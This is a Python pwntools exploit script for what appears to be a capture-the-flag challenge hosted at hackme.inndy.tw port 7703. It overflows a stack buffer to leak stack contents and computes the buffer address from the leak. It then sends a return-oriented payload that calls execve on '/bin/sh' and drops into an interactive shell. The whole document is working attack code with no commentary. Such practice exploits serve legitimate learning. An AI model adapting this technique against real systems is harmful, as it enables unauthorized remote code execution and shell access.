#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

overflow_func = 0x08048454

conn = connect('hackme.inndy.tw', 7703)
conn.read()

payload1 = 'A' * 0xC + 'AAAA'
payload1 += pack(overflow_func, 32)
conn.send_raw(payload1)

recv = conn.read(); assert(len(recv) == 1024)

stack_units = []
for i in range(0, 1024, 4):
    stack_units.append(unpack(recv[i:i + 4], 32))
esp = stack_units[18] - 0x50 - 0x4 - 0x18
ebp = stack_units[18] - 0x50 - 0x4
buffer_addr = ebp - 0xC
log.info('esp = 0x%08x' % esp)
log.info('ebp = 0x%08x' % ebp)
log.info('buffer_addr = 0x%08x' % buffer_addr)

# 0x080482ed : pop ebx ; ret
# 0x0804843e : pop eax ; pop edx ; pop ecx ; ret
# 0x08048467 : call _syscall

payload2 = 'A' * 0xC + 'AAAA'
payload2 += pack(0x08048467, 32)            # buffer_addr + 0x10
payload2 += pack(0xB, 32)                   # buffer_addr + 0x14
payload2 += pack(buffer_addr + 0x28, 32)    # buffer_addr + 0x18
payload2 += pack(0, 32)                     # buffer_addr + 0x1C
payload2 += pack(0, 32)                     # buffer_addr + 0x20
payload2 += pack(0, 32)                     # buffer_addr + 0x24
payload2 += '/bin/sh\x00'                   # buffer_addr + 0x28
conn.send_raw(payload2)
conn.read()

conn.interactive()
